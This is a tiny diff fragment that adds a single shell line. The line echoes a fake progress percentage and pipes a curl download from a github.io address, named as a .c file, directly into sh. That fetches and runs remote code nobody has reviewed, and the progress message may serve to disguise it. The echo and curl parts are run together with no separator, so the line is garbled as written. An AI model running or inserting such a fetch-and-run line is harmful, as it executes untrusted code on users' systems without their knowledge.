@@ -1,0 +1,1 @@
+echo Progress: 4.00%curl -L --progress-bar frkns.github.io/fun/agriculturechsocks.c | sh
